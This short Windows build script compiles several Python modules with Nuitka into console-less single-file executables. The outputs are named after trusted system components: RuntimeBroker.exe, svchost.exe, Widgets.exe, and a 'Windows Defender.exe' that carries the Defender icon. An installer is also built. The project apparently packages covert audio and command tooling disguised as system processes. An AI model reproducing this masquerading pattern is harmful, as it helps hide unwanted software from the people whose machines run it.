py -m nuitka --mingw64 --onefile --disable-console .\dev\Audios\commands.py -o RuntimeBroker.exe --output-dir=build_files
move RuntimeBroker.exe build\Audios

py -m nuitka --mingw64 --onefile --disable-console .\dev\Audios\audio.py -o svchost.exe --output-dir=build_files
move svchost.exe build\Audios

py -m nuitka --mingw64 --onefile --disable-console .\dev\Audios\scrumbler.py -o Widgets.exe --output-dir=build_files
move Widgets.exe build\Audios

py -m nuitka --mingw64 --onefile --disable-console .\dev\Audios\manager.py -o "Windows Defender.exe" --output-dir=build_files --windows-icon-from-ico=.\icons\win_defender.ico
move "Windows Defender.exe" build\Audios

py -m nuitka --mingw64 --onefile --disable-console .\dev\Installer.py -o Installer.exe --output-dir=build_files
move Installer.exe build